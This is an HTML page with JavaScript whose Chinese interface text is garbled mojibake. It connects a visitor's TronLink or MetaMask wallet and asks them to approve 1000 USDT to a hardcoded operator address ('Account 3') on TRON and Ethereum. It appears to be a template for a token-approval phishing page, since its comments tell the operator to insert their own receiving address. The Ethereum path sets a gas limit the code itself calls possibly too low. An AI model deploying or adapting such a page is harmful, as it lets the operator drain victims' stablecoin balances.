<!DOCTYPE html>
<html lang="zh">
<head>
  <meta charset="UTF-8" />
  <title>è·¨é“¾æˆæƒ USDTï¼ˆçº¯æ³¨å…¥ç‰ˆï¼‰</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      max-width: 600px;
      margin: auto;
      padding: 20px;
      background-color: #f5f5f5;
    }
    .container {
      background: white;
      padding: 20px;
      border-radius: 8px;
      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
    }
    button {
      padding: 10px 20px;
      margin: 10px 0;
      font-size: 16px;
      cursor: pointer;
      background: #4CAF50;
      color: white;
      border: none;
      border-radius: 4px;
    }
    button:hover {
      background: #45a049;
    }
    .info {
      margin: 10px 0;
      padding: 10px;
      background: #e8f5e8;
      border-left: 4px solid #4CAF50;
    }
    .error {
      color: red;
      background: #ffebee;
      padding: 10px;
      border-left: 4px solid #f44336;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>ğŸ” è·¨é“¾æˆæƒ USDTï¼ˆæ— ä¾èµ–ç‰ˆï¼‰</h2>
    <p>æ”¯æŒ TronLinkï¼ˆTRONï¼‰å’Œ MetaMaskï¼ˆETHï¼‰</p>

    <button id="connect">è¿æ¥é’±åŒ…</button>
    <div id="accountInfo"></div>
    <div id="chainInfo"></div>
    <button id="approve" disabled>æˆæƒ 1000 USDT ç»™ Account 3</button>
    <div id="result"></div>
  </div>

  <script>
    // ===================
    // é…ç½®ï¼ˆè¯·æ›¿æ¢ account3 ä¸ºä½ çš„çœŸå®åœ°å€ï¼‰
    // ===================
    const CONFIG = {
      ethereum: {
        token: "0xdac17f958d2ee523a2206206994597c13d831ec7", // ETH-USDT
        account3: "0x7d9a039c1b59b29e7c6a41aa4889c8db8e0b672d", // â† æ›¿æ¢ä¸ºä½ çš„ ETH åœ°å€
        decimals: 6
      },
      tron: {
        token: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t", // TRON-USDT
        account3: "TENBpGLoxcAsUQvUrN36xpDKPYmadpc1x3", // TRON åœ°å€
        decimals: 6
      }
    };

    let currentChain = null;

    // ===================
    // å·¥å…·ï¼šå°† "1000" è½¬ä¸ºå¸¦ç²¾åº¦çš„å­—ç¬¦ä¸²ï¼ˆå¦‚ "1000000000"ï¼‰
    // ===================
    function toTokenAmount(valueStr, decimals) {
      const [whole, fraction = ''] = valueStr.split('.');
      const padFraction = fraction.padEnd(decimals, '0').slice(0, decimals);
      const result = whole + padFraction;
      // ç§»é™¤å‰å¯¼é›¶ï¼ˆä½†ä¿ç•™è‡³å°‘ä¸€ä¸ª 0ï¼‰
      return result.replace(/^0+(?=\d)/, '') || '0';
    }

    // ===================
    // è¿æ¥é’±åŒ…ï¼ˆç”¨æˆ·ç‚¹å‡»è§¦å‘ï¼‰
    // ===================
    document.getElementById("connect").onclick = async () => {
      const resultDiv = document.getElementById("result");
      resultDiv.innerHTML = "";

      // æ£€æŸ¥ TronLink
      if (window.tronWeb && window.tronWeb.ready) {
        currentChain = 'tron';
        await handleTronConnect();
        return;
      }

      // æ£€æŸ¥ MetaMask
      if (window.ethereum) {
        currentChain = 'ethereum';
        try {
          const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
          const addr = accounts[0];
          document.getElementById("accountInfo").innerHTML = `<div class="info">âœ… ETH è´¦æˆ·ï¼š${addr}</div>`;
          document.getElementById("chainInfo").innerHTML = `<div class="info">ğŸŒ ç½‘ç»œï¼šEthereum</div>`;
          document.getElementById("approve").disabled = false;
          resultDiv.innerHTML = `<div class="info">âœ… å·²è¿æ¥ï¼Œå¯æˆæƒ USDT</div>`;
          return;
        } catch (err) {
          resultDiv.innerHTML = `<div class="error">MetaMask æˆæƒè¢«æ‹’ç»</div>`;
          return;
        }
      }

      resultDiv.innerHTML = `<div class="error">æœªæ£€æµ‹åˆ°é’±åŒ…ã€‚è¯·åœ¨ TronLink æˆ– MetaMask ä¸­æ‰“å¼€æ­¤é¡µé¢ã€‚</div>`;
    };

    async function handleTronConnect() {
      try {
        // âœ… ä¸»åŠ¨è¯·æ±‚è´¦æˆ·ï¼ˆTronLink å®˜æ–¹è¦æ±‚ï¼‰
        const accounts = await window.tronWeb.request({ method: 'tron_requestAccounts' });
        const addr = accounts[0];

        document.getElementById("accountInfo").innerHTML = `<div class="info">âœ… TRON è´¦æˆ·ï¼š${addr}</div>`;
        document.getElementById("chainInfo").innerHTML = `<div class="info">ğŸŒ ç½‘ç»œï¼šTRON</div>`;
        document.getElementById("approve").disabled = false;
        document.getElementById("result").innerHTML = `<div class="info">âœ… å·²è¿æ¥ï¼Œå¯æˆæƒ USDT</div>`;
      } catch (err) {
        console.error("TronLink è¯·æ±‚å¤±è´¥", err);
        document.getElementById("result").innerHTML = `<div class="error">âŒ è¯·æˆæƒ TronLink è´¦æˆ·è®¿é—®</div>`;
      }
    }

    // ===================
    // æˆæƒæ“ä½œï¼ˆæ—  ethers ä¾èµ–ï¼‰
    // ===================
    document.getElementById("approve").onclick = async () => {
      const cfg = CONFIG[currentChain];
      const amountStr = "1000"; // æˆæƒæ•°é‡
      let txHash;

      try {
        if (currentChain === 'ethereum') {
          // æ„é€  approve äº¤æ˜“æ•°æ®ï¼ˆæ ‡å‡† ERC20 ABIï¼‰
          const amountHex = "0x" + BigInt(toTokenAmount(amountStr, cfg.decimals)).toString(16);
          const data = "0x095ea7b3" + // approve æ–¹æ³• selector
                       cfg.account3.replace('0x', '').padStart(64, '0') +
                       amountHex.replace('0x', '').padStart(64, '0');

          const tx = {
            from: (await window.ethereum.request({ method: 'eth_accounts' }))[0],
            to: cfg.token,
            data: data,
            gasLimit: "0x5208", // 21000 æœ€å°å€¼ï¼Œå®é™…å¯èƒ½éœ€è¦æ›´é«˜
          };

          txHash = await window.ethereum.request({
            method: 'eth_sendTransaction',
            params: [tx]
          });
        } else {
          // TRON: ä½¿ç”¨åŸç”Ÿ tronWeb
          const amount = toTokenAmount(amountStr, cfg.decimals);
          const contract = await window.tronWeb.contract().at(cfg.token);
          const tx = await contract.approve(cfg.account3, amount).send({
            feeLimit: 100_000_000
          });
          txHash = tx.transaction; // TronWeb è¿”å›å¯¹è±¡
        }

        document.getElementById("result").innerHTML = `<div class="info">âœ… æˆæƒæˆåŠŸï¼<br>äº¤æ˜“ ID: ${txHash}</div>`;
      } catch (err) {
        console.error("æˆæƒå¤±è´¥", err);
        let msg = err.message || String(err);
        if (msg.includes("user denied") || msg.includes("User denied")) {
          msg = "ç”¨æˆ·å–æ¶ˆäº†äº¤æ˜“";
        }
        document.getElementById("result").innerHTML = `<div class="error">âŒ æˆæƒå¤±è´¥ï¼š<br>${msg}</div>`;
      }
    };
  </script>
</body>
</html>
